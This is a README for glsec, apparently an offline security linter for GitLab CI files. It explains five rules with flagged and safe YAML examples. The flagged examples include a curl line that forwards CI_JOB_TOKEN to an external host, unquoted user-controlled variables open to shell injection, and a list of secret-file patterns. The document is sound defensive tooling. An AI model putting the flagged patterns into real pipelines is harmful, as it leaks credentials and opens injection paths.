<p align="center">
  <img src="assets/glsec-bg.png" alt="glsec" width="400">
</p>

# glsec

**glsec** is a security linter for `.gitlab-ci.yml` files. It detects misconfigurations that can lead to supply-chain attacks, secret leakage, and token exfiltration — the same class of issues that [zizmor](https://github.com/zizmorcore/zizmor) and [actionlint](https://github.com/rhysd/actionlint) catch in GitHub Actions, but for GitLab CI.

```
$ glsec .gitlab-ci.yml

ERROR  .gitlab-ci.yml:7   GL001  image "node:latest" uses mutable tag "latest" — pin to a specific version or digest
WARN   .gitlab-ci.yml:14  GL002  variable $CI_COMMIT_REF_NAME in script is user-controlled and unquoted — wrap in double quotes
ERROR  .gitlab-ci.yml:3   GL003  project include "company/templates" missing "ref" — defaults to HEAD of default branch (mutable)
```

## Why glsec?

| Tool | Scope |
|------|-------|
| [zizmor](https://github.com/zizmorcore/zizmor) | GitHub Actions security |
| [actionlint](https://github.com/rhysd/actionlint) | GitHub Actions syntax + some security |
| [gitlab-ci-lint](https://docs.gitlab.com/api/lint/) | GitLab CI syntax only (requires API access) |
| **glsec** | GitLab CI security — works offline, no API key needed |

## Install

**Go install (requires Go 1.21+):**

```sh
go install github.com/glsec/glsec@latest
```

Binary downloads and Homebrew coming soon.

## Usage

```sh
# scan a file (exits 1 if findings, 0 if clean, 2 on error)
glsec .gitlab-ci.yml

# JSON output for machine consumption
glsec --format json .gitlab-ci.yml

# SARIF output for GitHub Code Scanning / GitLab SAST
glsec --format sarif .gitlab-ci.yml > gl.sarif
```

### Exit codes

| Code | Meaning |
|------|---------|
| 0 | No findings |
| 1 | One or more findings |
| 2 | Usage error or file could not be parsed |

## Rules

| ID | Severity | What it detects |
|----|----------|----------------|
| [GL001](#gl001-mutable-image-tag) | error | Mutable image tag (`latest`, no tag, non-SHA digest) |
| [GL002](#gl002-variable-injection) | warn | User-controlled CI variable used unquoted in script |
| [GL003](#gl003-unpinned-include-ref) | error | Remote `include:` with mutable or missing `ref` |
| [GL004](#gl004-ci_job_token-exfiltration) | warn | `CI_JOB_TOKEN` forwarded to a non-GitLab host |
| [GL005](#gl005-sensitive-artifacts) | warn | Sensitive file patterns in `artifacts:` or missing `expire_in` |

---

### GL001 — Mutable image tag

Using `latest`, a branch name, or no tag at all means the image can change between pipeline runs without any code change. This can silently introduce malicious code into your build.

**Flagged:**
```yaml
build:
  image: node:latest        # mutable tag
  script: [npm ci]

test:
  image: alpine             # no tag — defaults to latest
  script: [./test.sh]
```

**Safe:**
```yaml
build:
  image: node:20.11.0       # pinned version
  script: [npm ci]

test:
  image: alpine@sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b  # digest pin
  script: [./test.sh]
```

---

### GL002 — Variable injection

Several GitLab CI predefined variables are set from user-supplied data (branch name, MR title, commit message). Using them unquoted in `script:` allows an attacker who controls a branch name to inject arbitrary shell commands.

**Flagged:**
```yaml
deploy:
  script:
    - echo $CI_COMMIT_REF_NAME        # unquoted — branch name is attacker-controlled
    - ./deploy.sh $CI_MERGE_REQUEST_TITLE
```

**Safe:**
```yaml
deploy:
  script:
    - echo "$CI_COMMIT_REF_NAME"      # quoted — treated as a string, not parsed by shell
    - ./deploy.sh "$CI_MERGE_REQUEST_TITLE"
```

User-controlled variables checked: `CI_COMMIT_REF_NAME`, `CI_COMMIT_BRANCH`, `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `CI_MERGE_REQUEST_TITLE`, `CI_MERGE_REQUEST_DESCRIPTION`, `CI_COMMIT_MESSAGE`, `CI_COMMIT_TITLE`.

---

### GL003 — Unpinned include ref

Including a remote template without pinning `ref` to a SHA means the template can change at any time, allowing a compromised upstream repository to inject malicious jobs into your pipeline.

**Flagged:**
```yaml
include:
  - project: company/ci-templates
    file: /jobs/build.yml
    # no ref — uses HEAD of default branch

  - remote: https://example.com/template.yml   # URL content is mutable and unverified
```

**Safe:**
```yaml
include:
  - project: company/ci-templates
    file: /jobs/build.yml
    ref: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2   # full SHA pin
```

Local includes (`local:`) and GitLab-managed `template:` includes are not flagged.

---

### GL004 — CI_JOB_TOKEN exfiltration

`CI_JOB_TOKEN` grants access to your GitLab instance. Sending it to an external host — even in a header or query parameter — leaks credentials that can be used to read private repositories or trigger pipelines.

**Flagged:**
```yaml
upload:
  script:
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN https://external-registry.example.com/upload
```

**Safe:**
```yaml
upload:
  script:
    # use the GitLab Package Registry — stays on your GitLab instance
    - curl --header JOB-TOKEN=$CI_JOB_TOKEN "${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/generic/..."
```

---

### GL005 — Sensitive artifacts

Storing secrets in job artifacts exposes them to anyone with read access to the project. Missing `expire_in` keeps artifacts (and any secrets they contain) indefinitely.

**Flagged:**
```yaml
build:
  artifacts:
    paths:
      - .env              # environment file — may contain secrets
      - deploy.pem        # private key
    # no expire_in — artifacts kept forever
```

**Safe:**
```yaml
build:
  artifacts:
    paths:
      - dist/
    expire_in: 1 week
```

Sensitive patterns checked: `.env*`, `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.jks`, `id_rsa`, `id_ed25519`, `*.kube*`, `kubeconfig`, `*secret*`, `*credential*`, `*password*`.

---

## CI integration

### GitLab CI

```yaml
glsec:
  stage: test
  image: golang:1.24-alpine
  script:
    - go install github.com/glsec/glsec@latest
    - glsec .gitlab-ci.yml
```

### GitHub Actions

```yaml
- name: Run glsec
  run: |
    go install github.com/glsec/glsec@latest
    glsec .gitlab-ci.yml
```

### SARIF upload to GitHub Code Scanning

```yaml
- name: Run glsec (SARIF)
  run: |
    go install github.com/glsec/glsec@latest
    glsec --format sarif .gitlab-ci.yml > glsec.sarif || true
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: glsec.sarif
```

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

Apache 2.0
